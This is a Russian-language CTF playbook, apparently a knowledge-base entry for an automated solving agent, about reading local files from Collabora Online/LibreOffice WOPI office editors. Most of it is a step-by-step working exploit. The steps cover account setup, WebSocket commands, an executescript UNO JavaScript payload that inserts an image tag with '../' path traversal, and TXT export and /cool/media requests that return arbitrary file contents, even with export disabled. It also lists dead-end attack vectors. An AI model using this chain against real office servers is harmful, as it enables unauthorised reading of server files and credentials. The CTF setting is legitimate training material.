# Офисные онлайн-редакторы / WOPI / Collabora Online — универсальный рецепт

Применяй, когда в задаче ЕСТЬ хотя бы пара признаков из списка ниже. Не важно, как называется сервис (Docus, только Docs, OnlyOffice, LibreOffice Online и т.п.).

## Признаки (сигнатуры для маршрутизации)
- Пути `/wopi/files/<id>`, `/wopi/files/<id>/contents`, `/hosting/capabilities`, `/hosting/discovery`.
- Веб-сокеты `/cool/ws`, `/cool/media`, `/cool/convert-to`, URL вида `/browser/<rev>/cool.html`.
- Понятия в HTML/JS: `WOPISrc`, `CheckFileInfo`, `BaseFileName`, `TemplateSource`, `UserCanWrite`, `access_token_ttl`.
- Интерфейс: «создать документ/редактировать», загрузка .docx/.odt, «Сохранить», экспорт.

## ⛔ НЕ трать время на (проверено эмпирически, это тупики):
- SSRF через `FileUrl`/`TemplateSource` — поля поддельного `CheckFileInfo` — НЕ дают чтения локальных файлов.
- `file://` LFI через `FileUrl` (например, `file:///etc/passwd`) — блокируется.
- Макросы (`enable_macros_execution=false`) — отключены в безопасной сборке.
- `/cool/convert-to` снаружи — обычно 400 (не функционален).
- Перебор всех документов `dN` в поисках флага — флаг почти всегда НЕ в чужих документах (если не подсказано иначе).
- Поиск CVE по версии — делать только после того, как универсальный рецепт не сработал.

## ✅ Рабочий универсальный вектор: MEDIA TRAVERSAL
Суть: вставка в документ `<image src="file:///...">` с обходом `../` + экспорт в TXT → в экспорте появляется ссылка `/cool/media` → GET отдаёт содержимое локального файла.

### Шаги (общая схема)
1. **Аккаунт**: `POST /register` (form-urlencoded: `email`, `name`, `password`), затем `POST /login` — держи сессию.
2. **Создай документ**: найдите эндпоинт создания (`POST /docs/create {title}` → 302 на `/edit/dN`).
3. **Пропиши содержимое**: `PUT /wopi/files/<dN>/contents?access_token=...` с любым blob (текст) — БЕЗ этого экспорт падает (`kind=savefailed`).
4. **Токены**: из страницы `/edit/dN` парс iframe → `WOPISrc` и `access_token`.
5. **WebSocket** `/cool/ws?WOPISrc=<enc>&access_token=<tok>&access_token_ttl=0&no_auth_header=&permission=edit&compat=`:
   - `coolclient 0.1 <unix_ts_ms> 0`
   - `load url=<quote(wopi_src)> lang=en-US timezone=UTC clientvisiblearea=0;0;15000;15000`
   - ждать `status:` и `loaded:` (таймаут ~35 c + 3 c).
6. **executescript** (UNO-контекст):
   ```
   (() => {
     const ctx = uno.componentContext;
     const sm = ctx.getServiceManager();
     const sfa = sm.createInstanceWithContext('com.sun.star.ucb.SimpleFileAccess', ctx);
     try { sfa.createFolder('file:///tmp/<TAG>.txt'); } catch (e) {}
     const desktop = sm.createInstanceWithContext('com.sun.star.frame.Desktop', ctx);
     const doc = desktop.getCurrentComponent();
     const text = '<image src="file:///tmp/<TAG>.txt/' + '../'.repeat(10) + 'flag.txt"/>';
     doc.getText().setString(text);
     return doc.getText().getString();
   })()
   ```
   Отправка: `executescript 1 <js-одной-строкой>` → ждать `executescriptresult:` (~25 c).
7. **Экспорт**: `downloadas name=<TAG>.txt id=export format=txt options=` → ждать `downloadas:` (3–4 попытки по 120 c), достать `downloadid=...`.
8. **Скачать экспорт**: `GET /cool/<enc_wopi_src>/download/<id>?WOPISrc=<enc>&compat=/ws` → найти `src="...cool/media?WOPISrc=..&ServerId=..&ViewId=..&Tag=<TAG>"`.
9. **GET /cool/media?WOPISrc=..&ServerId=..&ViewId=..&Tag=<TAG>`** (без `compat`) → тело = флаг.

### Ключевые детали
- `file:///tmp/<TAG>.txt` должна быть **папкой** (createFolder) — тогда `../`×10 выводит к корню `/flag.txt`.
- Экспорт идёт даже при `DisableExport:true` в CheckFileInfo.
- `downloadas` медленный — ретраи обязательны.
- Свежий аккаунт на каждый запуск (иначе старые сессии/документы мешают).

## Как понять, что путь верный
- `executescriptresult:` возвращает строку, содержащую `<image src="file:///tmp/..."/ >`.
- После `downloadas` в экспорте есть `cool/media`.

## Куда писать опыт
- В случае успеха/новых деталей — сохрани урок через hermes-knowledge-loop. Общий урок-эталон: `knowledge-base/local/lessons/2026-11-01-office-libreoffice-wopi-media-traversal-solved.md`, рабочий PoC: `knowledge-base/local/toolbox/docus/docus_poc_run.py`.